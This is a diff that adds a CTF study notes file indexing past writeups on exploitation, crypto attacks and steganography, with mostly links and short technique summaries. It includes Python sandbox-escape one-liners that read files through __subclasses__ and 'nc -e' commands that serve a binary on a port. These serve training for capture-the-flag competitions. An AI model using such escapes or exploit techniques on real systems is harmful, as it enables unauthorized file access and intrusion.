@@ -1,0 +1,1381 @@
+# NOTES ON PAST CTFS WRITEUPS
+
+# videos
+https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w/videos
+
+# tools
+http://www.kitploit.com/2016/03/ctf-tools-some-setup-scripts-for.html?m=1
+
+# general notes
+for csaw writeups of all past CTFs: https://ctf.isis.poly.edu/writeups/
+has all writeups for ndh and volgactf: http://sigint.ru/writeups/
+
+# blogs
+https://w00tsec.blogspot.com.au/ bernadomr
+https://ctf.rip/ CaptureTheSwag
+https://0day.work/ InternetWache
+
+# gone over (skipped pwn & reverse tasks)
+* pico-ctf-2013
+* boston-key-party-2014
+* codegate-preliminary-2014
+a lot of reverse tasks and pwnables only 1 forensic and 1 web
+minibomb to redo (rop pas compris)
+* confidence-ds-ctf-teaser-2014
+* d-ctf-2014
+* asis-ctf-quals-2014
+* 9447-ctf-2014
+* 31c3-ctf-2014
+* defcon-ctf-qualifier-2014
+* ectf-2014
+* ghost-in-the-shellcode-2014
+* hack-lu-ctf-2014
+* hack-you-2014
+* hitcon-ctf-2014
+* ncn-ctf-2014
+* ncn-ctf-quals-2014
+* olympic-ctf-2014
+* phdays-2014-{quals,finals}
+* pwnium-ctf-2014
+* qiwi-ctf-2014
+* ructf-2014-quals
+* seccon-ctf-2014
+* secuinside-ctf-prequal-2014
+* 0ctf-2015
+* 32c3-ctf-2015 (itd pas compris)
+* 9447-ctf-2015 (ffmpeg 0day https://news.ycombinator.com/item?id=10893301 http://seclists.org/oss-sec/2016/q1/91)
+* asis-finals-ctf-2015
+* asis-quals-ctf-2015
+* backdoor-ctf-2015
+javascript and clojure sandbox escapes
+* bctf-2015
+* boston-key-party-2015
+* breakin-ctf-2015
+* bsides-vancouver-ctf-2015
+* camp-ctf-2015
+* codegate-ctf-2015
+* confidence-ctf-teaser-2015
+* csaw-ctf-2015
+* csaw-finals-ctf-2015
+* cyber-security-challenge-2015
+* dctf-2015
+* defcon-quals-2015 todo
+* easy-ctf-2015 do the exploits
+* ekoparty-ctf-2015
+* ekoparty-pre-ctf-2015
+* ghost-in-the-shellcode-2015
+
+* 0ctf-2016
+* ndh-quals-2016
+
+# writeups / to read {{{
+https://github.com/VulnHub/ctf-writeups
+https://github.com/pwning/public-writeup
+
+* flare-on 2015
+http://acidshout.github.io/
+
+* wheeeee - plaid-ctf-2014
+slide attack
+https://github.com/ctfs/write-ups-2014/tree/master/plaid-ctf-2014/wheeeee
+
+* pwnable300 harry-potter - plaid-ctf-2014
+http://eindbazen.net/2014/04/plaidctf-2014-harry_potter-300/
+
+* pwnable275 kappa - plaid-ctf-2014
+http://eindbazen.net/2014/04/plaidctf-2014-kappa-275/
+https://blog.skullsecurity.org/2014/plaidctf-writeup-for-pwn-275-kappa-type-confusion-vuln
+
+* hackvent-2015
+lots of qr codes: https://github.com/shiltemann/CTF-writeups-public/blob/master/Hackvent_2015/writeup.md
+# }}}
+
+# exploit {{{
+* python sandbox/jail escapes
+http://gynvael.coldwind.pl/n/python_sandbox_escape
+print(().__class__.__bases__[0].__subclasses__()[40]('./key').read()) (pybabbies - csaw-ctf-2014)
+{}.__class__.__base__.__subclasses__()[40]("/home/john/flag.txt").read() (exploit300 - volga-quals-2014)
+http://tasteless.eu/post/2014/01/phd-ctf-quals-2014-pyjail/
+http://eindbazen.net/2013/04/pctf-2013-pyjail-misc-400/
+
+* 4stone -doraemon - codegate-preliminary-2014
+disable aslr with ulimit -s unlimited
+gdb trick to find location of tls block (to overwrite location of kernel_vsyscall)
+shellcode in env with shortjumps (\xeb\02) to jump over env var key and equal sign
+trampoline to env found in libc (no longer randomized)
+https://github.com/maraud3rs/writeups/tree/master/codegate_4stone
+
+* angrey-doraemon - codegate-preliminary-2014
+stack overflow with canary bypass (leak)
+http://v0ids3curity.blogspot.com.au/2014/02/codegate-ctf-quals-2014-angry-doraemon.html
+
+* minibomb - codegate-preliminary-2014
+rop to call execve
+set eax via filling socket (write call returns actual byte count written)
+set ebx via gadget that sys_read from fd=1 (our socket)
+ecx is our argv
+http://mslc.ctf.su/wp/codegate-2014-quals-minibomb-pwn-400/
+
+* gynophage 4 - defcon-ctf-quals-2014
+shellcode polyglot (x86, ppc, armel, armeb)
+https://github.com/ctfs/write-ups-2014/tree/master/def-con-ctf-qualifier-2014/polyglot
+
+* nibble - nuit-du-hack-ctf-qualifications 2014
+pop + plt overwrite
+http://blog.dragonsector.pl/2014/04/nuit-du-hack-ctf-quals-2014-nibble.html
+
+* ezhp - plaid-ctf-2014
+heap overflow
+https://blog.skullsecurity.org/2014/plaidctf-writeup-for-pwnage-200-a-simple-overflow-bug
+http://danuxx.blogspot.ch/2014/04/plaidctf-2014-ezhp-heap-overflow.html
+while :;do nc -lnvp 4444 -e ./ezhp;done
+socat tcp-listen:4444,fork exec:./ezph
+
+* remote print - internetwache-ctf-2016
+format string
+https://github.com/ctfs/write-ups-2016/tree/master/internetwache-ctf-2016/exploit/remote-printer-80
+
+* equationsolver - internetwache-ctf-2016
+integer overlow
+http://poning.me/2016/03/04/equationsolver/ they used z3 to solve this one
+https://github.com/ctfs/write-ups-2016/tree/master/internetwache-ctf-2016/exploit/equationsolver-60
+
+* secure file reader - ndh-quals-2016
+rop and race condition
+http://maroueneboubakri.blogspot.com.au/2016/04/nuit-du-hack-quals-secure-file-reader.html
+
+* quine - icectf-2016
+service accepts C code and runs it
+# }}}
+
+# crypto {{{
+* rsa - pico-ctf-2013
+p, q, e and c provided
+use gmpy2 to decrypt ciphertext
+https://github.com/ctfs/write-ups-2013/tree/master/pico-ctf-2013/rsa
+
+* BREW'r'Y - hack-lu-ctf-2013
+graphs hamilton
+http://mslc.ctf.su/wp/hack-lu-2013-ctf-crypto-350-brewry/
+
+* ECKA - hack-lu-ctf-2013
+elliptic curve key agreement and diffie-hellman key exchange
+https://stratum0.org/blog/posts/2013/10/26/hack-dot-lu-2013-ecka/
+
+* FluxArchiv - hack-lu-ctf-2013
+home-made archive with scrambled pw (part1)
+find rc4-encrypted flag (part2) one team recontructed the keystream by using 2 encrypted archives that have the same content
+
+* Geier's Lambda - hack-lu-ctf-2013
+xTea cipher
+easy to find a collision because cipher only used first 4 chars of the key
+
+* maving is plain-Jane - hack-lu-ctf-2013
+Menezes-Vanstone, elliptic curve
+if you know one part of the plain text, you are able to calculate the other one
+
+* cryptomatv2 - csaw-quals-2013
+sqli via aes-128-cbc
+we can recover the IV that the webapp uses for aes-128-cbc because we can use the app to encrypt a message with our key and download the ciphertext
+encrypt a plaintext "abcdabcdabcdabcdabcdabcdabcdabcd" with a key "abcdabcdabcdabcd" via the webapp
+returned ciphertext: mq8jyy5npsr3t1DR/33B4ZlY304+NOCGLXGp7stWcKk=
+decrypt it with key "abcd" and a zero IV ('\0'*16) gives us the plaintext: Y Q"S30PYR4]XZ- abcdabcdabcd 
+XOR the first 16 bytes with "abcdabcdabcdabcd" gives the IV: 8k2F2QS480W998Nm
+http://blog.dragonsector.pl/2013/09/csaw-ctf-quals-2013-cryptomatv2-web-4002.html
+
+* csawpad - csaw-quals-2013
+stream cipher, same pad was used for all the ciphertexts (i.e. not a one-time pad at all!)
+guess the pad by trying to decrypt the first byte of each known ciphertext with 0-255 and discarding candidate when decrypted byte not in charset
+then bruteforce the rest of the pad
+http://delogrand.blogspot.com.au/2013/09/csaw-quals-2013-csawpad-cryptography-100.html
+
+* otp - 31c3-ctf-2014
+meet in the middle to forge valid otp
+precompute hashes of 3 byte and try to find a match when creating 4 byte hashes
+https://github.com/ctfs/write-ups-2014/tree/master/31c3-ctf-2014/crypto/otp
+
+* sso - 31c3-ctf-2014
+forge cookie because stream cipher without random iv
+https://github.com/ctfs/write-ups-2014/tree/master/31c3-ctf-2014/crypto/sso
+
+* hwaes - 31c3-ctf-2014
+aes key expansion
+we provide an aes key, server encrypts our data, then changes the aes key
+we can recover the original master from the derived key
+https://github.com/ctfs/write-ups-2014/tree/master/31c3-ctf-2014/crypto/hwaes
+
+* archaic - asis-ctf-quals-2014
+break merkle-hellman cryptosystem using LLL lattice reduction algo
+https://github.com/ctfs/write-ups-2014/tree/master/asis-ctf-quals-2014/archaic
+
+* decrypt-img - boston-key-party-2014
+bmp encrypted with 56-byte key
+bmp header is 54-byte so we can recover the key by xoring the first 54 bytes of the encrypted bmp
+https://hexpresso.wordpress.com/2014/03/02/bkp-ctf-decrypt-img-write-up/
+
+* xorxes - boston-key-party-2014
+hash collision due to using xor and bit shifting
+https://ctfcrew.org/writeup/29
+
+* mitm_ii - boston-key-party-2014
+mitm attack with pubkey exchange
+
+* differential power - boston-key-party-2014
+tea cipher
+used z3 to recover key
+http://mslc.ctf.su/wp/boston-key-party-ctf-differential-power-crypto-400/
+
+* psifer_school - csaw-cft-2014
+caesar, scytale and vigenere
+
+* crypto100 - confidence-ds-ctf-teaser-2014
+lotto with big bias on validation code (random salt) so we can map numbers to round uuids and only play when we can win for sure
+
+* crypt400 - defkthon-ctf-2014
+solve simple maths using fermat's little theorem
+http://blog.0xdeffbeef.com/2014/03/defkthon-ctf-2014-find-flag-crypto-400.html
+
+* pillowtalk - ghost-in-the-shellcode-2014
+keystream reuse (stream cipher)
+https://github.com/ctfs/write-ups-2014/tree/master/ghost-in-the-shellcode-2014/pillowtalk
+
+* wiener - hack-lu-ctf-2014
+rsa wiener
+https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/wiener
+
+* douchemac - hack-lu-ctf-2014
+dbus and bypass CBC-MAC hmac authentication
+https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/douchemac
+
+* peace pipe - hack-lu-ctf-2014
+mitm with pubkey' = -pubkey % p
+https://github.com/ctfs/write-ups-2014/tree/master/hack-lu-ctf-2014/peace-pipe
+
+* cryptonet - hack-you-2014
+we have a lot of flags encrypted with the same e=17, but with different modulos
+encflag1 = (flag^17) % n1, encflag2 = (flag^17) % n2, etc. we can find flag^17 using the Chinese Remainder Theorem (CRT)
+and recover flag by calculating its 17th root
+http://www.pwntester.com/blog/2014/01/17/hackyou2014-crypto400-write-up/
+
+* easy one - hack-you-2014
+crypto maison
+recover key because we have plaintext & ciphertext
+http://www.pwntester.com/blog/2014/01/16/hackyou2014-crypto100-write-up/
+
+* hashme - hack-you-2014
+recover key via xor(plaintext, ciphertext), hash length extension and parameter pollution
+http://www.pwntester.com/blog/2014/01/16/hackyou2014-crypto200-write-up/
+
+* matrix - hack-you-2014
+4x4 matrix encryption system
+reversible using inverse matrixes
+we can recover key K because: E = P * K then P.I * E = P.I * P * K so K = P.I * E (P.I is the inverse of P)
+encrypted file is a WMV video, so we can use the 16-byte magic number to recover the key
+http://www.pwntester.com/blog/2014/01/16/hackyou2014-crypto300-write-up/
+
+* mic - olympic-ctf-2014
+chinese remainder
+we send to server prime p and base g
+server sends pow(g*flag, flag, p) * flag + flag mod p
+we can get rid of powered flag by sending p-g
+https://github.com/ctfs/write-ups-2014/tree/master/olympic-ctf-2014/mic
+
+* mars - phd-ctf-quals-2014
+client sends n1 to server
+server sends n2 to client
+client sends c1 to server
+server sends c2 to client
+
+p = n2 / egcd(n1, n2)[0]
+plaintext message m is a number < p
+so pow(m, e, n) % p == pow(m, e, p) and d = invmod(e, phy(p) and p is prime so phy(p) == p-1
+we recover d = invmod(0x010001, p-1) and m = pow(c, d, p)
+http://blog.ptsecurity.com/2014/05/phdays-ctf-quals-tasks-analysis.html
+
+* wheeeee - plaid-ctf-2014
+encryption oracle
+slide attack: https://fail0verflow.com/blog/2014/plaidctf2014-crypto375-wheeeee.html
+
+* tls - ructf-2014-quals
+decrypt tls because client uses non-random number generator (always returns 1337)
+we recover the client secret exponent from diffie-hellman key exchange
+we compute Pre-Master Secret and then the Master Secret as PRF for wireshark
+http://blog.dragonsector.pl/2014/03/ructf-2014-quals-tls-crypto-300.html
+
+* pillow - secuinside-ctf-prequal-2014
+TO READ
+https://github.com/ctfs/write-ups-2014/tree/master/secuinside-ctf-prequal-2014/pillow
+
+* crypto100 - volga-quals-2014
+ciphertext is a big number, we have an encryption oracle, each letter is assigned a number and an exponent depending on its position
+they are all multiplied together to produce the ciphertext
+need to factorize the ciphertext to find which letters were used
+https://github.com/ctfs/write-ups-2014/tree/master/volga-quals-2014/crypto/100
+
+* another one - nuit-du-hack-ctf-qualifications 2014
+encrypted bmp in ecb mode. Assume all identical 16-byte blocks are white pixels, anything else is black pixels.
+https://doegox.github.io/ElectronicColoringBook/
+
+* twenty - plaid-ctf-2014
+vigenere cracked using hill climbing
+
+* rsa - plaid-ctf-2014
+partially masked RSA private key (paper/tools can recover it as long as 27% of bits are known)
+
+* graphs - plaid-ctf-2014
+rien compris
+https://github.com/ctfs/write-ups-2014/tree/master/plaid-ctf-2014/graphs
+
+* parlor - plaid-ctf-2014
+md5 hash length extension attack
+https://fail0verflow.com/blog/2014/plaidctf2014-crypto250-parlor.html
+
+* rsaha - hitcon-ctf-2014
+Franklin-Reiter Related Message attack
+the 2 plaintexts only differ by a known fixed difference allowing their ciphertext to be decrypted
+server sends: n, m^3 % n and (m+1)^3 % n
+we can recover m with: ((m+1)^3 + 2*m^3 - 1) / ((m+1)^3 - m^3 + 2) = m mod n
+    http://pastie.org/9482057
+f = (m+1)^3 + 2*m^3 - 1 % n
+g = (m+1)^3 - m^3 + 2 % n
+m = (f * gmpy.invert(g, n)) % n
+
+    http://pastebin.com/4SQhQXHb
+    <ricky> You're given m^3 and (m+1)^3 = m^3 + 3m^2 + 3m + 1
+    <ricky> From this you can compute m^2 + m + 1
+    <ricky> m^3 - 1 = (m - 1)(m^2 + m + 1)
+
+* emdee - olympic-ctf-2014
+md5(salt + input + timestamp)
+%7f deletes previous salt chars so we can recover salt
+http://www.pwntester.com/blog/2014/02/09/olympic-ctf-curling-tasks/#curling300emdee
+
+* rsa-mistakes-200 - pico-ctf-2014
+two messages related to each other (i.e. have almost the same content (specifically content := unique-prefix + flag) , encrypted by the same public key
+https://github.com/ctfs/write-ups-2014/tree/master/pico-ctf-2014/master-challenge/rsa-mistakes-200
+
+* block - pico-ctf-2014
+meet in the middle to recover the 2 keys used in a substituion-permutation cryptosystem
+https://ehsandev.com/pico2014/cryptography/block.html
+
+* substitution - pico-ctf-2014
+break substitution cipher
+https://ehsandev.com/pico2014/cryptography/substitution.html
+
+* revenge - pico-ctf-2014
+forge rsa signature
+https://ehsandev.com/pico2014/cryptography/revenge.html
+
+* ecc - pico-ctf-2014
+y^2 = x^3 + a(x) + b mod n
+we have C (X, Y), a, and n but not b
+we recover b then decrypt C
+https://ehsandev.com/pico2014/cryptography/ecc.html
+
+* related - ructf-2014-quals
+Franklin-Reiter Related Message attack
+we have c1 and c2 (m1 = m.'Jane', m2 = m.'Alex')
+m^e - c1 = 0 mod n and (m+delta)^e - c2 = 0 mod n with delta=s2int("Jane")-s2int("Alex") and def s2int(x): int(x.encode("hex"), 16)
+get gcd(m^e - c1, (m+delta)^e - c2) => x-d1 (x=(m+delta) and d1 is a decrypted c1)
+
+* decrypt it - seccon-ctf-2014
+encrypted file is xored with rand() seeded with the file's timestamp
+then rabin asymetric cryptosystem
+2 solutions: bruteforce or Chinese remainder theorem
+
+* wtc rsa bbq - tinyctf-2014
+twin primes, modulus very close to a power of 2
+we can start factoring from the square root of the modulus
+https://github.com/ctfs/write-ups-2014/tree/master/tinyctf-2014/wtc-rsa-bbq
+
+* old cryptography - 0ctf-2015
+poly-alphabetic substitution with a non-uniform shift
+https://b01lers.net/challenges/0ctf/Old%20cryptography/39/
+
+* rsaquine - 0ctf-2015
+need to find m so m^e = m % p and m^e = m % q
+and m^(e - 1) = 1 % p (same applies for q hereafter)
+we find g a generator so g^k != 1 % p for 0<k<p-1
+and g^(k*(p-1)) = 1 % p for all k>=0
+for each m with 0<m<p there exists a x so that m = g^x % p
+so we need to find x such that g^(x*(e-1)) = 1 % p
+the solutions are solutions of the equation k*(p-1) = x*(e-1)
+http://tasteless.eu/post/2015/03/0ctf-2015-rsaquine/
+
+* rsasr - asis-finals-ctf-2015
+emirp, sqrt(N) has 155 digits so we need to figure out 77 digits on each side
+https://github.com/ctfs/write-ups-2015/tree/master/asis-finals-ctf-2015/crypto/RSASR
+
+* honeywwall - asis-finals-ctf-2015
+egcd, we have c = msg_0^e %N_0 and c2 = msg_0^e2 % N_0 (flag is msg_0)
+we find x and y such that xe + ye2 = 1
+we recover msg_0 with c^x * c2^y % N_0 
+because msg_0^(xe) * msg_0^(ye2) % N_0 = msg_0^(xe+ye2) % N_0 = msg_0 % N_0 = msg_0
+https://kt.pe/blog/2015/10/asis-2015-finals-honeywall/
+
+* giloph - asis-finals-ctf-2015
+diffie-hellman with pohlig-hellman attack because p-1 can be factored into small numbers
+http://blog.squareroots.de/en/2015/10/asis-ctf-finals-2015-giloph-crypto-300/
+
+* sed - asis-finals-ctf-2015
+DES with 10 different keys Ek10=keys[10](Ek9=keys[9](Ek8...
+and bruteforce k1 & k2 so that Ek1(Ek2(plain)) = plain
+http://blog.squareroots.de/en/2015/10/asis-ctf-finals-2015-10-sed-crypto-175/
+
+* angler - asis-quals-ctf-2015
+simple permutation cipher with a key of 13
+https://github.com/ctfs/write-ups-2015/tree/master/asis-quals-ctf-2015/crypto/angler
+
+* falsecrypt - asis-quals-ctf-2015
+NTRU publickey cryptosystem that cant be broken by Shor's algorithm
+https://github.com/ctfs/write-ups-2015/tree/master/asis-quals-ctf-2015/crypto/falsecrypt
+
+* golden metal - asis-quals-ctf-2015
+Goldwasser-Micali cryptosystem solved with msieve factorization
+https://github.com/ctfs/write-ups-2015/tree/master/asis-quals-ctf-2015/crypto/golden-metal
+
+* cross check - asis-quals-ctf-2015
+p very close from q, use fermat  to recover factors
+a = fermat(N, N1, N2) with N = N1 * N2 = p1*q1*p2*q2
+then p1 = gcd(N1, a) and q1 = N1 / p1
+https://b01lers.net/challenges/ASIS%202015/Cross%20Check/52/
+
+* rsanne - backdoor-ctf-2015
+modulus consists of 2281 1s followed by 2203 0s, allowing factorization: (2^2281 - 1)(2^2203 - 1)
+
+* rsalot - backdoor-ctf-2015
+100 public keys and an RSA-encrypted flag file
+two keys must have a moduli n with a common prime factor (can be p or q but it was p in this task)
+we find the two keys where n1 = p*q1 and n2 = p*q2 (or n1 = p1*q or n2 = p2*q)
+we can then easily factor n1 and n2 by calculating the gcd of n1 and n2: gcd(n1, n2) = p (see gcd.py)
+then use rsatool.py -p .. -q .. -o private.pem and openssl rsautl ...
+
+* weak_enc - bctf-2015
+lzm compression before encryption = side-channel attack
+server encrypts our input as lzm(salt||$input), we can deduce chars in salt by looking at length of ciphertext
+first submit empty empty input to have the length of compressed salt
+then submit every bigrams to server to find what bigrams are in salt, then do same for trigrams, quadgrams etc. until the first n-gram doesnt yield any new info
+once we have a set of n-grams comprising the salt, we try every combination offline to match the null ciphertext
+once we have reovered salt, we decrypt target ciphertext by constructing a reverse LSW dictionary
+https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2015/BCTF/crypto/weak_enc
+
+* warmup - bctf-2015
+rsa wiener attack
+https://github.com/ctfs/write-ups-2015/tree/master/bctf-2015/crypto/warmup
+
+* wood island - boston-key-party-2015
+el gamal signature, provided sigs with r reused we can recover private key
+https://github.com/ctfs/write-ups-2015/tree/master/boston-key-party-2015/crypto/wood-island
+had also an unintended way
+server used the python json library to decode the string into a dict and the
+is_duplicate() check was a simple “user_dict in list” so adding a field to the
+json was enough to pass the check.
+
+* orient heights - boston-key-party-2015
+same as wood island is_duplicate() just compared the binary ASN1 encoding; so again adding a field caused it to fail.
+https://r3dey3.com/2015-03/bkpctf-wood-island-and-orient-heights/
+
+* wonderland - boston-key-party-2015
+elliptic curve discrete logarithm problem solved using a twist attack on a Montgomery ladder
+and apply Chinese Remainder Theorem to recover the key
+the actual attack, then, uses a variation of Pollard's Rho algorithm to compute the discrete logarithms
+https://github.com/ctfs/write-ups-2015/tree/master/boston-key-party-2015/crypto/wonderland
+
+* bowdoin - boston-key-party-2015
+partially masked RSA private key (partial p & q)
+http://gnoobz.com/bkpctf-2015-bowdoin-writeup.html
+
+* airport - boston-key-party-2015
+timing oracle, modular exponentiation, square-and-multiply
+https://github.com/ctfs/write-ups-2015/tree/master/boston-key-party-2015/crypto/airport
+
+* good crypto - codegate-ctf-2015
+flag is the passphrase that was converted into the wep key
+wep uses a LCG (linear congruental generator) prng, seed is generated from the passphrase
+and the wep key is generated by using the 3rd byte of the 5 first numbers from the lcg prng
+https://github.com/ctfs/write-ups-2015/tree/master/codegate-ctf-2015/programming/good-crypto
+
+* rsaq - pragyan-ctf-2016
+same as rsalot but q is the common prime factor
+
+* haunted 1's - pragyan-ctf-2015
+ciphertext only consists of 0s or digits in the 2-9 range. Replace everything that is not 0 with 1, binary becomes ascii.
+
+* substitution - pragyan-ctf-2015
+we are given the start of the key ("prgyan"), decipher msg with:
+'dhkuagsn'.translate(string.maketrans("prgyanbcdefhijklmoqstuvwxz", "abcdefghijklmnopqrstuvwxyz"))
+
+* weak rsa - pragyan-ctf-2015
+twin primes, pubkey can be factorized using fermats -> p & q recovered
+rsatool.py takes p & q to create privatekey.pem
+openssl rsautl -in ct.bin -inkey privatekey.pem -decrypt -raw to decrypt message
+
+* substitution - breakin-ctf-2015
+https://github.com/ctfs/write-ups-2015/tree/master/break-in-ctf-2015/crypto/substitution
+
+* ts-sci-nz - bsides-vancouver-ctf-2015
+keypad cipher
+https://github.com/ctfs/write-ups-2015/tree/master/bsides-vancouver-ctf-2015/crypto/ts-sci-nz
+
+* level0x3 - eff-ctf-2016
+one letter is "encrypted" into 4 numbers but the sum of all 4 numbers is always the same value
+
+* level0x5 - eff-ctf-2016
+rsa public exponent very low/small (3)
+see small-exponent.py
+
+* trivia300 - nullcon-hackim-2016 
+Bill's Cipher (funky substituion cipher for kids) "Gravity Falls"
+
+* crypto1 - nullcon-hackim-2016 
+given ciphertext and cleartext, XOR both to get key and decrypt another ciphertext
+
+* crypto5 - nullcon-hackim-2016 
+given several public RSA keys and a ciphertext, python script
+interestingly, the ciphertext was encrypted using the private key
+in RSA, either key in a keypair can be used as the private or public component
+
+* rail fence - su-ctf-2016
+break_transposition_railfence.py 
+
+* zeus - su-ctf-2016
+encoding with hamming code and interleaved with helical scan matrix
+https://github.com/p4-team/ctf/tree/master/2016-02-05-sharif/crypto_300_zeus
+
+* british elevator - su-ctf-2016
+elliptic curves
+http://hxp.io/blog/25/
+
+* TAPIR - internetwache-ctf-2016
+each symbol maps to a planet number -> German Stasi TAPIR decoding -> morse code
+https://losfuzzys.github.io/writeup/2016/02/21/iwctf2016-crypto-pirat/
+
+* oh bob - internetwache-ctf-2016
+3 small pubkeys (228 bit) we can factor with egcd (or yafu)
+https://www.xil.se/post/internetwache-2016-crypto60-kbeckmann/
+
+* vigenere - pragyan-ctf-2016
+flag.txt: loi wtnk az cyhimzm8kka12mo (vigenere)
+found key using the "tabula recta" (http://practicalcryptography.com/ciphers/vigenere-gronsfeld-and-autokey-cipher/)
+loi wtnk az cyhimzm8kka12mo (vigenere)
+the flag is
+SHE RINE SH
+key was "SHERINE" and can be used to decrypt the rest
+
+* a number's game - internetwache-ctf-2016
+use sympy to solve equations
+
+* its prime time - internetwache-ctf-2016
+provided a number, find next prime (sympy works)
+
+* hashdesigner - internetwache-ctf-2016
+find collision for custom hash
+
+* eso-tape - internetwache-ctf-2016
+implement an interpreter for the TapeBagel esoteric language
+
+* des ofb - boston-key-party-2016
+des in stream cipher mode with a weak key == keystream repetition
+
+* bobs hat - boston-key-party-2016
+l1: rsa with p and q similar -> easy to factor 1024 modulus
+l2: 2 moduli with a common factor
+l3: q is small so we can easily factorize the modulus
+l4: wiener attack (huge exponent)
+
+* ltseorg - boston-key-party-2016
+groestel hash collision
+quick win with 00 turning into padding (https://0day.work/boston-key-party-ctf-2016-writeups/#ltseorg)
+expected solution: https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/BKPCTF/crypto/ltseorg
+
+* more like zkp - boston-key-party-2016
+graph 3-coloring
+https://github.com/ctfs/write-ups-2016/tree/master/boston-key-party-2016/crypto/more-like-zkp-4
+
+* equation - 0ctf-2016
+recovering a partially masked RSA private key
+https://0day.work/0ctf-2016-quals-writeups/ https://github.com/p4-team/ctf/tree/master/2016-03-12-0ctf/equation
+
+* rsa? - 0ctf-2016
+modulus factored into 3 primes
+solve with gauss and wolframalpha and crt
+https://github.com/p4-team/ctf/tree/master/2016-03-12-0ctf/rsa
+
+* special rsa - bctf-2016
+not rsa (it's the secret k that is powed, not m). We can recover k with egcd
+c = k^r * m mod N (we know c, r, m and N and we have 2 plaintexts and 2 ciphertexts with the same k)
+c1 = k^r1 * m1 mod N and c2 = k^r2 * m2 mod N
+k^r1 = c1 * m1^-1 mod N, k^r2 = c2 * m2^-1 mod N
+egcd(r1, r2) returns g, a, b with  (a * r1) + (b * r2) == 1
+(k^r1)^a * (k^r2)^b = k^(a*r1 + b*r2) = k^1 = k
+https://gist.github.com/elliptic-shiho/489804cd675ed11d7adb
+https://cryptsec.wordpress.com/2016/03/21/bctf-2016-write-up-special-rsa-crypto-200/ (sage script)
+
+* one one zero - camctf-2016
+weak public key (330 bit) found on factordb.com
+chunks too small to be decrypted with openssl rsautl, so wrote decrypt-rsa.py
+
+* xxy - volga-ctf-quals-2016
+breaking Goldreich-Goldwasser-Halevi lattice encryption
+http://hxp.io/blog/26/
+
+* rabit - plaid-ctf-2016
+parity oracle - exploit least significant bit oracle using binary-search
+in malleable cryptosystems (like RSA or Rabin), the property exists:
+c = m^e % N
+y = x^e % N
+c' = (c*y) % N = (m^e % N)*(x^e % N) % N = (m^e * x^e) % N = (m*x)^e % N
+so we can arbitrarily multiply the plaintext, with Rabin if we multiply ciphertext by 4 we multiply plaintext by 2
+we send 4*CT (sqrt_mod(4*CT, N) = sqrt_mod(4, N)*sqrt_mod(CT, N) = 2*PT mod N), if lsb == 0 then 2*PT < N otherwise 2*PT > N
+https://github.com/smokeleeteveryday/CTF_WRITEUPS/tree/master/2016/PCTF/crypto/rabit
+
+* sexec - plaid-ctf-2016
+attacking a small instance of Ring-LWE based cryptosystem with Babai’s Nearest Vector algorithm
+http://mslc.ctf.su/wp/plaidctf-2016-sexec-crypto-300/
+
+* spotted wobbegong - google-ctf-2016
+rsa pkcs1.5 padding oracle
+http://mslc.ctf.su/wp/google-ctf-spotted-wobbegong-crypto-100/
+
+* little crypto gambler - ctfx-2016
+pseudorandom numbers generated using a Linear Congruential Generator
+several fast ways to crack them based on only a few outputs
+one way can be found here: http://security.stackexchange.com/a/4306
+bet 1 ~7 times and calculate the LCG parameters, then calculate the next number and bet everything
+https://github.com/bobacadodl/ctfx-problems/tree/master/crypto/little_crypto_gambler-150
+
+* twin primes - tokyo-western-ctf-2016
+flag encrypted with 2 keys. key1 with modulus p*q. key2 with modulus (p+2)*(q+2)
+https://github.com/TeamContagion/CTF-Write-Ups/tree/master/TokyoWesterns-2016/Twin%20Primes
+or use sympy to automatically solve equation (related-moduli.py)
+
+* dam - asis-ctf-2016
+generalized version of the Pallier cryptosystem: the Damgard–Jurik cryptosystem
+hoping server generates a key with a small prime factor
+https://github.com/p4-team/ctf/tree/master/2016-09-09-asis-final/dam
+
+* secuprim - asis-ctf-2016
+provide the number of primes and perfect powers in a given range
+ranges are small so we can just iterate and use gmpy2.is_prime and gmpy2.is_power
+https://github.com/p4-team/ctf/tree/master/2016-09-09-asis-final/secu_prim
+
+* races - asis-ctf-2016
+combination of ECC and RSA (ECRSA)
+flag encrypted with a lot of public keys, use gmpy2 to find two public rsa keys that share the same prime and factor them
+decrypt flag using the provided multiply function (implements Montgomery Ladder Scalar Multiplication on Elliptic Curve)
+https://github.com/p4-team/ctf/tree/master/2016-09-09-asis-final/races
+http://blog.ankursundara.com/asis-ctf-finals-2016-races/
+# }}}
+
+# stegano {{{
+* blocks - asis-ctf-quals-2014
+361x361 png image
+19x19 image hidden in alpha plane 0 (LSB)
+xor 2 images to get flag
+https://github.com/ctfs/write-ups-2014/tree/master/asis-ctf-quals-2014/blocks
+
+* tortureous sound - asis-ctf-quals-2014
+spectrogram analysis
+SSTV
+http://www.incertia.net/blog/asis-2014-quals-tortureous-sound/
+
+* white-noise - asis-ctf-quals-2014
+extract RGB values of each pixel, G and B are coordinates (scatter-plot) displaying the flag
+https://github.com/ctfs/write-ups-2014/tree/master/asis-ctf-quals-2014/white-noise
+
+* a-png-tale - confidence-ctf-teaser-2015
+flag hidden in IDAT chunk via a filter
+
+* pixel-princess - ectf-2014
+jpg containing a hidden jpg
+use steghide to extract tar.gz from main jpg
+https://github.com/ctfs/write-ups-2014/tree/master/ectf-2014/pixel-princess
+
+* shift keying - ghost-in-the-shellcode-2015-teaser
+demodulate gnuradio to a jpg
+https://github.com/ctfs/write-ups-2014/tree/master/ghost-in-the-shellcode-2015-teaser/dont-panic-shift-keying
+
+* godmode - nuit-du-hack-ctf-qualifications 2014
+info hidden in LSB (least significant bit)
+http://dem0version.wordpress.com/2012/03/14/hello-world/
+rotate 90 degrees clockwise and use stegsolve -> Data extract, tick Red 0, Green 0, Blue 0 and Column, and click Preview
+
+* the greatest - nuit-du-hack-ctf-qualifications 2014
+extract gif file
+get some info:
+$ gifsicle --xinfo greg.gif
+There is no much possibilities for stegano in GIF as the image is made of refs to the colormap so it could be:
+  - position of pixels of a given color
+  - duplicates or alike in the colormap (e.g. #cccccc and #cccbcc) or other tricks 
+So let's dump the colormap:
+$ gifsicle --color-info greg.gif
+  greg.gif 1 image
+  logical screen 500x645
+  global color table [256]
+  |   0: #FFFFFF      64: #A3835C     128: #1E3E71     192: #769DD1
+  |   1: #FCF5F6      65: #A37F81     129: #030915     193: #0F314D
